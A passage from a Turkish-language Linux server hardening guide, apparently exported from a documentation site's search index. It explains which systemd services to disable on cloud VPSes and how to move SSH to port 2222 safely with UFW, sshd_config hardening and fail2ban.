ASLA S\u0130LME <code>systemd-networkd</code> A\u011f yap\u0131land\u0131rmas\u0131 (IP alma vb.). \u26d4\ufe0f ASLA S\u0130LME <code>systemd-resolved</code> DNS (Domain Name) \u00e7\u00f6z\u00fcmleme. \u26d4\ufe0f ASLA S\u0130LME <code>systemd-timesyncd</code> Saat senkronizasyonu (NTP). Loglar ve g\u00fcvenlik i\u00e7in \u015fart. \u2705 Kals\u0131n <code>ModemManager</code> USB Modem / SIM kart y\u00f6netimi. \ud83d\uddd1 S\u0130L (Sunucuda gereksiz) <code>rpcbind</code> NFS dosya payla\u015f\u0131m\u0131 i\u00e7in port atar. NFS yoksa g\u00fcvenlik riskidir. \ud83d\uddd1 S\u0130L (NFS yoksa) <code>vnstat</code> A\u011f trafi\u011fi izleme arac\u0131 (Ne kadar GB harcad\u0131m?). \u2705 \u0130ste\u011fe Ba\u011fl\u0131 <code>wpa_supplicant</code> Wi-Fi ba\u011flant\u0131 y\u00f6neticisi. \ud83d\uddd1 S\u0130L (Kablosuz de\u011filse)"},{"location":"security/service-glossary/#4-depolama-storage","title":"4. Depolama (Storage)","text":"<p>Disk y\u00f6netimi ile ilgili servisler.</p> Servis Ad\u0131 A\u00e7\u0131klama Karar <code>iscsid</code> A\u011f \u00fczerinden disk ba\u011flama (iSCSI). Oracle Block Volume kullan\u0131yorsan\u0131z \u015fart. \u26a0\ufe0f D\u0130KKAT (Block Volume varsa S\u0130LME) <code>multipathd</code> Diske giden birden fazla yol varsa y\u00f6netir. Tek diskli VM'lerde gereksiz. \ud83d\uddd1 S\u0130L (Sadece Boot Volume ise) <code>udisks2</code> Masa\u00fcst\u00fcnde USB tak\u0131nca otomatik ba\u011flayan ara\u00e7. Sunucuda gereksiz. \ud83d\uddd1 S\u0130L <code>fstrim</code> SSD disklerin \u00f6mr\u00fcn\u00fc uzatmak i\u00e7in bak\u0131m yapar. \u2705 Kals\u0131n"},{"location":"security/service-glossary/#5-konteyner-ve-uygulama-docker-apps","title":"5. Konteyner ve Uygulama (Docker &amp; Apps)","text":"Servis Ad\u0131 A\u00e7\u0131klama Karar <code>docker</code> Docker Engine. Konteynerleri \u00e7al\u0131\u015ft\u0131r\u0131r. \u2705 Kals\u0131n (Kullan\u0131yorsan\u0131z) <code>containerd</code> Docker'\u0131n alt\u0131ndaki konteyner \u00e7al\u0131\u015fma zaman\u0131. \u2705 Kals\u0131n (Docker varsa) <code>snapd</code> Snap paket y\u00f6neticisi. Oracle Agent buna ba\u011f\u0131ml\u0131 olabilir. \u26a0\ufe0f KONTROLL\u00dc S\u0130L"},{"location":"security/service-glossary/#6-guvenlik-security","title":"6. G\u00fcvenlik (Security)","text":"Servis Ad\u0131 A\u00e7\u0131klama Karar <code>fail2ban</code> SSH brute-force sald\u0131r\u0131lar\u0131n\u0131 engeller. \u2705 Kals\u0131n (CrowdSec yoksa) <code>apparmor</code> Uygulama bazl\u0131 g\u00fcvenlik profilleri. \u2705 Kals\u0131n <code>unattended-upgrades</code> Otomatik g\u00fcvenlik g\u00fcncellemelerini yapar. \u2705 \u015e\u0130DDETLE \u00d6NER\u0130L\u0130R <code>ufw</code> / <code>firewalld</code> G\u00fcvenlik duvar\u0131. \u2705 Biri mutlaka \u00e7al\u0131\u015fmal\u0131 (\u0130kisi de\u011fil)"},{"location":"security/service-glossary/#7-gereksiz-donanm-bloatware","title":"7. Gereksiz Donan\u0131m (Bloatware)","text":"<p>Sunucularda (genelde) bulunmayan donan\u0131mlar i\u00e7in servisler.</p> Servis Ad\u0131 A\u00e7\u0131klama Karar <code>cups</code> Yaz\u0131c\u0131 servisi. Sunucudan \u00e7\u0131kt\u0131 almayacaksan\u0131z gereksiz. \ud83d\uddd1 S\u0130L <code>cups-browsed</code> A\u011fdaki yaz\u0131c\u0131lar\u0131 otomatik bulur. \ud83d\uddd1 S\u0130L <code>bluetooth</code> Bluetooth cihaz y\u00f6netimi. \ud83d\uddd1 S\u0130L <code>alsa-state</code> Ses kart\u0131 ayarlar\u0131. \ud83d\uddd1 S\u0130L <code>smartmontools</code> Fiziksel disk sa\u011fl\u0131k kontrol\u00fc. (Sanal sunucuda disk sanal oldu\u011fu i\u00e7in \u00e7o\u011fu zaman i\u015fe yaramaz ama zarar\u0131 da yoktur). \ud83e\udd37\u200d\u2642\ufe0f Fark etmez"},{"location":"security/service-glossary/#ozet-temizlik-komutu","title":"\u00d6zet: Temizlik Komutu","text":"<p>E\u011fer yukar\u0131daki tablodan emin olduysan\u0131z, en yayg\u0131n gereksizleri temizlemek i\u00e7in:</p> <pre><code># Servisleri durdur\nsudo systemctl stop cups cups-browsed bluetooth ModemManager udisks2 rpcbind\n\n# Ba\u015flang\u0131\u00e7ta \u00e7al\u0131\u015fmas\u0131nlar\nsudo systemctl disable cups cups-browsed bluetooth ModemManager udisks2 rpcbind\n\n# Durum kontrol\u00fc\nsystemctl status cups\n</code></pre>"},{"location":"security/services/","title":"Gereksiz Servislerin Temizli\u011fi (Multi-Cloud)","text":"<p>Sanal sunucular (VPS), genellikle \u00e7ok ama\u00e7l\u0131 imajlardan t\u00fcretilir. Bu imajlar, \"her duruma uysun\" diye ihtiyac\u0131n\u0131z olmayan onlarca servisle y\u00fckl\u00fc gelir.</p> <p>Bu rehber Oracle Cloud, Google Cloud (GCP), Alibaba Cloud, AWS, Azure ve DigitalOcean \u00fczerindeki Ubuntu, Debian ve CentOS sistemleri i\u00e7in ge\u00e7erlidir.</p>"},{"location":"security/services/#1-analiz-neyin-calstgn-gor","title":"1. Analiz: Neyin \u00c7al\u0131\u015ft\u0131\u011f\u0131n\u0131 G\u00f6r","text":"<p>K\u00f6rlemesine servis kapatmay\u0131n. \u00d6nce neyin \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 g\u00f6r\u00fcn. Listede g\u00f6rd\u00fc\u011f\u00fcn\u00fcz servislerin ne i\u015fe yarad\u0131\u011f\u0131n\u0131 \u00f6\u011frenmek i\u00e7in Servis S\u00f6zl\u00fc\u011f\u00fc sayfas\u0131na bak\u0131n.</p> Debian / Ubuntu <p><code>systemctl list-units --type=service --all     # Veya sadece \u00e7al\u0131\u015fanlar\u0131 g\u00f6rmek i\u00e7in:     systemctl list-units --type=service --state=running</code></p> CentOS / RHEL <p><code>systemctl list-units --type=service --state=running</code></p>"},{"location":"security/services/#2-hzl-referans-tablosu","title":"2. H\u0131zl\u0131 Referans Tablosu \u26a1\ufe0f","text":"<p>Hangi servise ne yapaca\u011f\u0131n\u0131za karar veremiyorsan\u0131z bu tabloyu kullan\u0131n:</p> Servis Ne Yapar Kapat\u0131labilir mi? Risk cups Yaz\u0131c\u0131 y\u00f6netimi \u2705 EVET Yok bluetooth Bluetooth \u2705 EVET Yok ModemManager Modem/SIM \u2705 EVET Yok rpcbind NFS port map \u26a0\ufe0f NFS yoksa EVET D\u00fc\u015f\u00fck multipathd \u00c7oklu disk yolu \u26a0\ufe0f SAN yoksa EVET Orta iscsid iSCSI disk \u274c HAYIR (Block Volume varsa) Y\u00fcksek cloud-init \u0130lk boot ve IP \u274c ASLA Kritik snapd Snap paketler \u26a0\ufe0f Agent veya App yoksa Orta postfix/exim4 Mail g\u00f6nderme \u26a0\ufe0f Cron/Fail2ban yoksa D\u00fc\u015f\u00fck firewalld Firewall \u26a0\ufe0f UFW kurulacaksa EVET Orta vnstat Trafik izleme \u2705 \u0130ste\u011fe ba\u011fl\u0131 Yok"},{"location":"security/services/#3-guvenli-temizlik-sras","title":"3. G\u00fcvenli Temizlik S\u0131ras\u0131 \ud83c\udfaf","text":"<p>ASLA t\u00fcm servisleri ayn\u0131 anda kapatmay\u0131n! Ad\u0131m ad\u0131m ilerleyin.</p>"},{"location":"security/services/#adm-1-kesinlikle-gereksizler-bloatware","title":"Ad\u0131m 1: Kesinlikle Gereksizler (Bloatware)","text":"<p>Sunucuda yaz\u0131c\u0131, modem veya ses kart\u0131 yoktur.</p> Temizlik Komutu <p>```bash # Servisleri durdur sudo systemctl stop cups cups-browsed bluetooth ModemManager udisks2 sudo systemctl disable cups cups-browsed bluetooth ModemManager udisks2</p>"},{"location":"security/services/#opsiyonel-eger-tamamen-silmek-isterseniz","title":"(Opsiyonel) E\u011fer tamamen silmek isterseniz:","text":""},{"location":"security/services/#sudo-apt-purge-y-cups-bluez-alsa-utils-modemmanager","title":"sudo apt purge -y cups bluez alsa-utils ModemManager","text":""},{"location":"security/services/#sudo-apt-autoremove-y","title":"sudo apt autoremove -y","text":"<pre><code>!!! info \"Hata Al\u0131rsan\u0131z Sevinin! \ud83c\udf89\"\nE\u011fer `Failed to stop... unit not loaded` hatas\u0131 al\u0131rsan\u0131z, bu harika bir haberdir! O servis zaten sisteminizde y\u00fckl\u00fc de\u011fil demektir. Hi\u00e7bir \u015fey yapman\u0131za gerek yok.\n\n!!! tip \"Kapatmak m\u0131, Silmek mi?\"\n_ **Disable:** \"\u015eimdilik \u00e7al\u0131\u015fma ama dosyalar dursun, belki laz\u0131m olur.\" (G\u00fcvenli)\n_ **Mask:** \"Asla ve asla \u00e7al\u0131\u015fma, kimse seni \u00e7a\u011f\u0131ramazs\u0131n.\" (Daha G\u00fcvenli) \\* **Purge:** \"K\u00f6kten sil, dosyalar\u0131n\u0131 da yok et.\" (En Temiz - Paket ad\u0131n\u0131 k\u00fc\u00e7\u00fck harfle yaz\u0131n!)\n\n### Ad\u0131m 2: snapd (Snap Paket Y\u00f6neticisi)\n\nCanonical'\u0131n konteyner tabanl\u0131 paket sistemi.\n\n**Kapatmal\u0131 m\u0131y\u0131m?**\n\n- **HAYIR:** E\u011fer `snap list` \u00e7\u0131kt\u0131s\u0131nda \u015funlar varsa:\n  - `oracle-cloud-agent` (Oracle Cloud)\n  - `amazon-ssm-agent` (AWS)\n  - `google-cloud-ops-agent` (GCP)\n  - `core`, `snapd`, `lxd` (Sistem bile\u015fenleri)\n  - `certbot` (E\u011fer snap ile kurulduysa)\n- **EVET:** Liste tamamen bo\u015fsa VE snap kullanmayacaksan\u0131z.\n\n```bash\n# Kontrol et\nsnap list\n\n# E\u011fer liste BO\u015eSA veya gereksizse:\nsudo systemctl stop snapd snapd.socket\nsudo systemctl disable snapd snapd.socket\n# sudo apt purge snapd -y  # Sadece Ubuntu/Debian ve eminseniz!\n</code></pre>"},{"location":"security/services/#adm-3-ag-ve-depolama-kontrollu-gidin","title":"Ad\u0131m 3: A\u011f ve Depolama (Kontroll\u00fc Gidin)","text":""},{"location":"security/services/#multipath-tools-multipathd","title":"Multipath Tools (<code>multipathd</code>)","text":"<p>Kapatmal\u0131 m\u0131y\u0131m?</p> <ul> <li>EVET: Standart bir VM ise ve sadece Boot Volume kullan\u0131yorsan\u0131z. Ek diskiniz (<code>/dev/sdb</code>) olsa bile <code>/dev/mapper</code> alt\u0131nda g\u00f6r\u00fcnm\u00fcyorsa.</li> <li>HAYIR: Kurumsal SAN/iSCSI yap\u0131s\u0131nda, diski <code>/dev/mapper/mpatha</code> gibi bir isimle kullan\u0131yorsan\u0131z.</li> </ul>"},{"location":"security/services/#iscsi-servisi-iscsid-dikkat","title":"iSCSI Servisi (<code>iscsid</code>) - D\u0130KKAT! \u26d4","text":"<p>Oracle Cloud Block Volume kullan\u0131c\u0131lar\u0131 i\u00e7in HAYAT\u0130D\u0130R.</p> <ul> <li>HAYIR: Ekledi\u011finiz Block Volume'ler iSCSI protokol\u00fc ile \u00e7al\u0131\u015f\u0131r. Kapat\u0131rsan\u0131z diskiniz ve veriniz kaybolur!</li> <li>EVET: Sadece Boot Volume kullan\u0131yorsan\u0131z ve gelecekte de disk eklemeyecekseniz (Sadece bu durumda).</li> </ul>"},{"location":"security/services/#rpc-bind-rpcbind","title":"RPC Bind (<code>rpcbind</code>)","text":"<p>Kapatmal\u0131 m\u0131y\u0131m? NFS (Dosya Payla\u015f\u0131m\u0131) kullanm\u0131yorsan\u0131z kapat\u0131n.</p> <pre><code>sudo systemctl stop rpcbind\nsudo systemctl disable rpcbind\nsudo systemctl stop rpcbind.socket\nsudo systemctl disable rpcbind.socket\n</code></pre>"},{"location":"security/services/#4-kritik-uyarlar","title":"4. Kritik Uyar\u0131lar! \u26a0\ufe0f","text":""},{"location":"security/services/#firewall-caksmas","title":"Firewall \u00c7ak\u0131\u015fmas\u0131","text":"<p>ASLA iki firewall servisi ayn\u0131 anda \u00e7al\u0131\u015fmamal\u0131d\u0131r.</p> <ul> <li>Ubuntu: <code>ufw</code> kullan\u0131yorsan\u0131z <code>firewalld</code> veya <code>iptables-persistent</code> \u00e7ak\u0131\u015fabilir.</li> <li>CentOS: <code>firewalld</code> varsay\u0131land\u0131r. <code>ufw</code> kuracaksan\u0131z <code>firewalld</code> KAPATILMALIDIR.</li> </ul> <pre><code># CentOS i\u00e7in Firewalld kapatma (E\u011fer UFW kullanacaksan\u0131z):\nsudo systemctl stop firewalld &amp;&amp; sudo systemctl disable firewalld\nsudo systemctl mask firewalld # Tekrar a\u00e7\u0131lmas\u0131n\u0131 engeller\n</code></pre>"},{"location":"security/services/#mail-transfer-agent-mta","title":"Mail Transfer Agent (MTA)","text":"<p>Postfix (CentOS) veya Exim4 (Ubuntu). Sistem e-postalar\u0131 (Cron, Fail2Ban bildirimleri) i\u00e7in kullan\u0131l\u0131r. D\u0131\u015far\u0131ya mail atmayacaksan\u0131z:</p> <ol> <li>G\u00fcvenli: Sadece <code>localhost</code> dinlemesini sa\u011flay\u0131n (<code>inet_interfaces = loopback-only</code>).</li> <li>Agresif: Tamamen kapat\u0131n (Log takibi zorla\u015fabilir).</li> </ol> <pre><code># Kapatmak i\u00e7in:\nsudo systemctl stop postfix exim4\nsudo systemctl disable postfix exim4\n</code></pre>"},{"location":"security/services/#getty-servisleri-arm-sunucular-dikkat","title":"Getty Servisleri (ARM Sunucular Dikkat!)","text":"<ul> <li><code>getty@tty1</code> -&gt; Fiziksel konsol.</li> <li><code>serial-getty@ttyAMA0</code> -&gt; ARM (Oracle Ampere) Serial Console.</li> </ul> <p>UYARI: Oracle Cloud ARM sunucularda <code>serial-getty@ttyAMA0</code> servisini SAKIN KAPATMAYIN. SSH eri\u015fiminiz kesilirse sunucuyu kurtarman\u0131n tek yolu Web Konsol'dur ve o da bu servise ba\u011fl\u0131d\u0131r.</p>"},{"location":"security/services/#5-bulut-ajanlar-cloud-agents-dokunmayin","title":"5. Bulut Ajanlar\u0131 (Cloud Agents) - DOKUNMAYIN! \u26d4","text":"<p>Her bulut sa\u011flay\u0131c\u0131s\u0131 y\u00f6netimi i\u00e7in kendi ajan\u0131n\u0131 y\u00fckler. Silerseniz Reboot/Reset Password \u00f6zellikleri bozulur.</p>"},{"location":"security/services/#evrensel","title":"Evrensel","text":"<ul> <li>cloud-init: T\u00fcm bulutlarda (AWS, GCP, Oracle, Azure) vard\u0131r. \u0130lk IP ve Key ayarlar\u0131n\u0131 yapar. ASLA S\u0130LMEY\u0130N.</li> </ul>"},{"location":"security/services/#oracle-cloud-infrastructure-oci","title":"Oracle Cloud Infrastructure (OCI)","text":"<ul> <li>Servisler: <code>oracle-cloud-agent</code>, <code>oracle-cloud-agent-updater</code></li> <li>Not: Genelde Snap veya Systemd servisidir. Dokunmay\u0131n.</li> </ul>"},{"location":"security/services/#google-cloud-platform-gcp","title":"Google Cloud Platform (GCP)","text":"<ul> <li>Servisler: <code>google-guest-agent</code> (Metadata/Network), <code>google-oslogin-agent</code> (SSH Key Y\u00f6netimi)</li> <li>Risk: Silerseniz GCP Console'dan SSH yapamazs\u0131n\u0131z.</li> </ul>"},{"location":"security/services/#amazon-web-services-aws","title":"Amazon Web Services (AWS)","text":"<ul> <li>Servisler: <code>amazon-ssm-agent</code>, <code>amazon-cloudwatch-agent</code></li> <li>Risk: SSM Session Manager eri\u015fimi kaybolur.</li> </ul>"},{"location":"security/services/#alibaba-azure-digitalocean","title":"Alibaba &amp; Azure &amp; DigitalOcean","text":"<ul> <li>Alibaba: <code>aliyun-service</code></li> <li>Azure: <code>walinuxagent</code> (waagent)</li> <li>DigitalOcean: <code>digitalocean-agent</code></li> <li>Hetzner: <code>hcloud-init</code></li> </ul> <p>Genel Kural: Servis ad\u0131nda <code>agent</code>, <code>guest</code>, <code>monitoring</code> veya sa\u011flay\u0131c\u0131 ad\u0131 (<code>oracle</code>, <code>aws</code> vb.) ge\u00e7iyorsa DOKUNMAYIN.</p>"},{"location":"security/services/#6-son-kontrol-listesi","title":"6. Son Kontrol Listesi \u2705","text":"<p>Temizlik sonras\u0131 son bir kontrol i\u00e7in \u015fu komutu \u00e7al\u0131\u015ft\u0131r\u0131p \"k\u0131rm\u0131z\u0131 bayrak\" listedekiler var m\u0131 bak\u0131n:</p> <pre><code># Gereksiz servis kontrol\u00fc:\nsudo systemctl list-units --type=service --state=running | \\\n  grep -iE \"cups|bluetooth|modem|rpcbind|postfix|exim4|multipath|vnstat|udisks2|polkit|alsa|pulse\"\n</code></pre> <ul> <li>\u00c7\u0131kt\u0131 BO\u015eSA: M\u00fckemmel! \ud83c\udf89 Sunucunuz temiz ve g\u00fcvenli.</li> <li>\u00c7\u0131kt\u0131 VARSA: Listeyi ve yukar\u0131daki \"\u0130stisnalar\"\u0131 tekrar kontrol edin.</li> </ul>"},{"location":"security/ssh/","title":"SSH G\u00fcvenli Port De\u011fi\u015ftirme (adim-adim)","text":"<p>Bu rehber, SSH portunu 22'den 2222'ye ta\u015f\u0131rken \"i\u00e7eride kilitli kalmaman\u0131z\" i\u00e7in en g\u00fcvenli y\u00f6ntemi anlat\u0131r.</p>"},{"location":"security/ssh/#hazrlk-mevcut-durumu-gor","title":"Haz\u0131rl\u0131k: Mevcut Durumu G\u00f6r","text":"<p>\u00d6nce \u015fu an hangi portun dinledi\u011fini ve UFW durumunu kontrol edin:</p> <pre><code>sudo ufw status verbose\n# \u00c7\u0131kt\u0131 \"Status: active\" ise kurallar i\u015fliyor demektir.\n# \"Inactive\" ise firewall kapal\u0131d\u0131r, yine de a\u015fa\u011f\u0131dakileri yap\u0131n.\n\nsudo ss -lntp | grep sshd\n# \u00c7\u0131kt\u0131da \":22\" g\u00f6r\u00fcyorsan\u0131z \u015fu an standart porttas\u0131n\u0131z. ok.\n</code></pre>"},{"location":"security/ssh/#adm-1-firewall-sigortas-ufw","title":"Ad\u0131m 1: Firewall Sigortas\u0131 (UFW)","text":"<p>SSH ayar\u0131n\u0131 de\u011fi\u015ftirmeden \u00f6nce, Firewall'da hem mevcut kap\u0131y\u0131 hem yeni kap\u0131y\u0131 a\u00e7mal\u0131y\u0131z. Bu \"sigorta\" i\u015flemidir.</p> <ol> <li> <p>Mevcut portu garantiye al (Sigorta):</p> <pre><code>sudo ufw allow 22/tcp\n</code></pre> </li> <li> <p>Yeni hedef portu a\u00e7:</p> <pre><code>sudo ufw allow 2222/tcp\n</code></pre> </li> <li> <p>Temel kurallar ve aktifle\u015ftirme:</p> <pre><code>sudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw enable\n# \"Yes\" deyin. Ba\u011flant\u0131n\u0131z kopmaz \u00e7\u00fcnk\u00fc 22'ye izin verdik.\n</code></pre> </li> <li> <p>Kontrol: <pre><code>sudo ufw status numbered\n# \u00c7\u0131kt\u0131da HEM 22/tcp HEM 2222/tcp \"ALLOW\" olarak g\u00f6r\u00fcnmeli.\n</code></pre></p> </li> </ol> <p>[!WARNING] &gt; AWS, Oracle ve Cloud Kullan\u0131c\u0131lar\u0131: Sadece UFW yetmez! Kulland\u0131\u011f\u0131n\u0131z panelden (AWS Security Groups, Oracle Security List, Hetzner Firewall vb.) 2222 portuna izin vermelisiniz. Yoksa \"bah\u00e7e kap\u0131s\u0131\" kapal\u0131 oldu\u011fu i\u00e7in eve giremezsiniz.</p>"},{"location":"security/ssh/#adm-2-konfigurasyon-degisikligi","title":"Ad\u0131m 2: Konfig\u00fcrasyon De\u011fi\u015fikli\u011fi","text":"<p>\u015eimdi SSH servisine \"Art\u0131k 2222'den dinle\" diyece\u011fiz.</p> <p>Dosyay\u0131 a\u00e7\u0131n:</p> <pre><code>sudo nano /etc/ssh/sshd_config\n</code></pre> <p>[!TIP] &gt; Port Se\u00e7imi: 2222 \u00e7ok bilinen bir alternatiftir. Daha az taranan bir port se\u00e7mek isteyebilirsiniz (\u00f6rn: 41922, 52022). Ancak 1024 \u00fcst\u00fc olmal\u0131.</p> <p>[!WARNING] &gt; RHEL/CentOS/Rocky Linux Kullan\u0131c\u0131lar\u0131: SELinux, varsay\u0131lan olarak SSH'\u0131n port de\u011fi\u015ftirmesini engeller. \u015eu komutu \u00e7al\u0131\u015ft\u0131rmal\u0131s\u0131n\u0131z:</p> <pre><code>sudo semanage port -a -t ssh_port_t -p tcp 2222\n# semanage yoksa: sudo dnf install policycoreutils-python-utils\n</code></pre> <p>\u015eunlar\u0131 d\u00fczenleyin (sat\u0131r\u0131n ba\u015f\u0131nda <code>#</code> varsa kald\u0131r\u0131n):</p> <pre><code>Port 2222\nPermitRootLogin no\nPasswordAuthentication no\n</code></pre> <p>Kaydet ve \u00e7\u0131k (<code>Ctrl+O</code>, <code>Enter</code>, <code>Ctrl+X</code>).</p>"},{"location":"security/ssh/#adm-3-ubuntu-2204-socket-sorunu-en-garanti-yontem","title":"Ad\u0131m 3: Ubuntu 22.04+ Socket Sorunu (En Garanti Y\u00f6ntem)","text":"<p>Ubuntu 22.04 ve sonras\u0131nda SSH, \"Socket Activation\" ile \u00e7al\u0131\u015f\u0131r. \u00d6nce durumunuzu kontrol edin:</p> <pre><code># Socket modunda m\u0131s\u0131n\u0131z kontrol edin\nif systemctl is-enabled ssh.socket 2&gt;/dev/null | grep -q \"enabled\"; then\n    echo \"\u26a0\ufe0f  Socket Activation aktif - A\u015fa\u011f\u0131daki ad\u0131mlar\u0131 uygulay\u0131n\"\nelse\n    echo \"\u2705 Klasik mod - Bu ad\u0131m\u0131 atlay\u0131p Ad\u0131m 4'e ge\u00e7ebilirsiniz\"\nfi\n</code></pre> <p>E\u011fer Socket Aktifse:</p> <p>Socket ayarlar\u0131n\u0131 d\u00fczenlemek i\u00e7in \u015fu komutu girin:</p> <pre><code>sudo systemctl edit ssh.socket\n</code></pre> <p>A\u00e7\u0131lan bo\u015f sayfaya \u015funlar\u0131 yap\u0131\u015ft\u0131r\u0131n ve kaydedin (<code>Ctrl+O</code>, <code>Enter</code>, <code>Ctrl+X</code>):</p> <pre><code>[Socket]\nListenStream=\nListenStream=2222\n</code></pre> <p>(Not: \u0130lk sat\u0131rdaki bo\u015f <code>ListenStream=</code> varsay\u0131lan 22 portunu siler, ikincisi yenisini ekler.)</p> <p>De\u011fi\u015fikli\u011fi uygulay\u0131p servisi yeniden ba\u015flat\u0131n:</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl restart ssh.socket\n</code></pre>"},{"location":"security/ssh/#adm-4-test-ve-restart","title":"Ad\u0131m 4: Test ve Restart","text":"<p>Hatay\u0131 restart atmadan \u00f6nce yakalamal\u0131y\u0131z.</p> <ol> <li> <p>Config syntax testi:</p> <pre><code>sudo sshd -t\n</code></pre> <p>(\u00c7\u0131kt\u0131 yoksa her \u015fey yolunda demektir. Hata varsa d\u00fczeltin!)</p> </li> <li> <p>Servisi yeniden ba\u015flat:</p> <pre><code>sudo systemctl restart ssh\n</code></pre> <p>(Ba\u011flant\u0131n\u0131z hala kopmad\u0131, korkmay\u0131n.)</p> </li> <li> <p>Dinlenen Portu Do\u011frula: <pre><code>sudo ss -lntp | grep 2222\n# \u00c7\u0131kt\u0131: LISTEN ... :2222 ... users:((\"sshd\")) veya systemd\n</code></pre></p> </li> </ol>"},{"location":"security/ssh/#adm-5-iceriden-baglant-testi-localhost","title":"Ad\u0131m 5: \u0130\u00e7eriden Ba\u011flant\u0131 Testi (Localhost)","text":"<p>Yeni terminal a\u00e7madan \u00f6nce, sunucunun kendi kendine 2222'den ba\u011flanabildi\u011fini do\u011frulay\u0131n:</p> <pre><code>ssh -v -p 2222 localhost\n</code></pre> <p>\u015eifre veya key soruyorsa (veya \"Permission denied\" diyorsa) port \u00e7al\u0131\u015f\u0131yor demektir. <code>-v</code> ile detaylar\u0131 g\u00f6rebilirsiniz.</p>"},{"location":"security/ssh/#adm-6-dsardan-baglant-testi","title":"Ad\u0131m 6: D\u0131\u015far\u0131dan Ba\u011flant\u0131 Testi","text":"<ol> <li>Mevcut terminali KAPATMAYIN.</li> <li>AWS/Cloud Panel Kontrol\u00fc: Security Group ayarlar\u0131nda tcp/2222 portunu a\u00e7t\u0131\u011f\u0131n\u0131zdan emin olun.</li> <li>Bilgisayar\u0131n\u0131zdan yeni bir terminal a\u00e7\u0131n.</li> <li>Ba\u011flanmay\u0131 deneyin:     <pre><code>ssh -p 2222 kullanici@sunucu-ip\n</code></pre></li> </ol>"},{"location":"security/ssh/#adm-7-temizlik-eski-kapy-kapat","title":"Ad\u0131m 7: Temizlik (Eski Kap\u0131y\u0131 Kapat)","text":"<p>Ba\u015far\u0131yla girdiyseniz art\u0131k 22'ye ihtiyac\u0131n\u0131z yok.</p> <pre><code>sudo ufw delete allow 22/tcp\nsudo ufw reload\n</code></pre> <p>Art\u0131k sadece 2222 a\u00e7\u0131k! \ud83d\udd12</p>"},{"location":"security/ssh/#adm-8-ileri-duzey-hardening-lynis-onerileri","title":"Ad\u0131m 8: \u0130leri D\u00fczey Hardening (Lynis \u00d6nerileri)","text":"<p>Bu ayarlar sadece \"puan art\u0131rmak\" i\u00e7in de\u011fildir; sunucunuzun yeteneklerini k\u0131s\u0131tlayarak sald\u0131r\u0131 y\u00fczeyini daralt\u0131r.</p> <p>Neden Gerekli?</p> <ol> <li>TcpForwarding (T\u00fcnelleme): Varsay\u0131lan olarak SSH, sunucunuzu bir \"Proxy\" gibi kullanmaya izin verir. Bir sald\u0131rgan \u015fifrenizi ele ge\u00e7irirse, sizin sunucunuz \u00fczerinden internete \u00e7\u0131k\u0131p ba\u015fka yerlere sald\u0131rabilir (IP'nizi kirletir). Bunu kapat\u0131yoruz.</li> <li>X11Forwarding: Sunucuda grafik aray\u00fcz (pencere, mouse vs.) kullanm\u0131yorsan\u0131z bu \u00f6zellik gereksiz bir g\u00fcvenlik riskidir. Kapat\u0131yoruz.</li> <li>ClientAlive: Kullan\u0131c\u0131 bilgisayar ba\u015f\u0131ndan kalkt\u0131ysa, SSH oturumu sonsuza kadar a\u00e7\u0131k kalmas\u0131n, otomatik kapans\u0131n istiyoruz.</li> </ol> <p>Uygulama:</p> <p>SSH'da \u00f6nemli bir kural vard\u0131r: \"\u0130lk okunan sat\u0131r ge\u00e7erlidir.\" Bu y\u00fczden dosyan\u0131n en alt\u0131na eklemek yerine, mevcut sat\u0131rlar\u0131 bulup de\u011fi\u015ftirmek en garantili y\u00f6ntemdir.</p> <ol> <li>Dosyay\u0131 a\u00e7\u0131n: <code>sudo nano /etc/ssh/sshd_config</code></li> <li><code>Ctrl+W</code> ile a\u015fa\u011f\u0131daki ayarlar\u0131 arat\u0131n.</li> <li>Ba\u015flar\u0131nda <code>#</code> varsa silin (yorum sat\u0131r\u0131ndan \u00e7\u0131kart\u0131n).</li> <li>De\u011ferlerini \u015fu \u015fekilde g\u00fcncelleyin:</li> </ol> <pre><code># Proxy/VPN olarak kullan\u0131lmas\u0131n\u0131 engelle\nAllowTcpForwarding no\nAllowAgentForwarding no\nX11Forwarding no\n\n# Bo\u015f oturumlar\u0131 at (5 dakika sonra)\nClientAliveInterval 300\nClientAliveCountMax 2\n\n# Giri\u015f denemelerini k\u0131s\u0131tla\nMaxAuthTries 3\nMaxSessions 2\n</code></pre> <p>(E\u011fer dosyada bu sat\u0131rlar\u0131 bulamazsan\u0131z, en alta ekleyebilirsiniz.)</p> <pre><code># ==============================================\n# LYNIS HARDENING (Level 2)\n# ==============================================\n\n# T\u00fcnelleme ve Y\u00f6nlendirmeyi Kapat\n# (Sald\u0131rgan sunucuyu proxy gibi kullanamas\u0131n)\nAllowTcpForwarding no\nAllowAgentForwarding no\nX11Forwarding no\n\n# Bo\u015f Duran Ba\u011flant\u0131lar\u0131 Kes\n# (2 deneme x 300 saniye = 10 dakika sonra cevap vermeyen client'\u0131 at)\nClientAliveInterval 300\nClientAliveCountMax 2\n\n# Giri\u015f Deneme Haklar\u0131n\u0131 K\u0131s\u0131tla\n# (Brute-force sald\u0131r\u0131lar\u0131 i\u00e7in ek zorluk)\nMaxAuthTries 3\nMaxSessions 2\n\n# Log Seviyesini Art\u0131r\n# (Sald\u0131r\u0131 analizi i\u00e7in daha fazla detay)\nLogLevel VERBOSE\n\n# TCP KeepAlive Kapat\n# (Hayalet ba\u011flant\u0131lar\u0131 \u00f6nler, ClientAlive ile birlikte kullan\u0131l\u0131r)\nTCPKeepAlive no\n</code></pre> <p>Ayarlar\u0131 uygulay\u0131n:</p> <p>sudo sshd -t &amp;&amp; sudo systemctl reload ssh</p> <pre><code>---\n\n## Ad\u0131m 9: Fail2Ban Hat\u0131rlatmas\u0131 \ud83d\udc6e\u200d\u2642\ufe0f\n\nPort de\u011fi\u015ftirdi\u011finiz i\u00e7in Fail2Ban'\u0131n da haberi olmal\u0131. Yoksa sald\u0131rganlar\u0131 eski kap\u0131da arar.\n\n1.  Dosyay\u0131 a\u00e7\u0131n: `sudo nano /etc/fail2ban/jail.local`\n2.  `[sshd]` b\u00f6l\u00fcm\u00fcn\u00fc bulun ve portu g\u00fcncelleyin:\n\n```ini\n[sshd]\nenabled = true\nport = 2222\n</code></pre> <ol> <li>Fail2Ban'\u0131 yeniden ba\u015flat\u0131n: <code>sudo systemctl restart fail2ban</code></li> </ol>"},{"location":"security/ssh/#adm-10-acil-durum-geri-donus-rollback","title":"Ad\u0131m 10: Acil Durum: Geri D\u00f6n\u00fc\u015f (Rollback) 